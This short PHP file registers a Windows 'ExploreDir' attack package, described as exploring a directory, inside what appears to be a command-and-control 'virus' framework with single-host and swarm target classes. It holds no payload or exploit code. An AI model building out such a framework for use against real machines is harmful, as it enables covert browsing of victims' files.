<?php

use Kelvinho\Virus\Attack\Classes;

/** @var \Kelvinho\Virus\Attack\PackageRegistrar $packageRegistrar */

$packageRegistrar->iRegister("win.oneTime.ExploreDir", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ExploreDir\\ExploreDir", "easy.ExploreDir", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Explores a particular directory.");
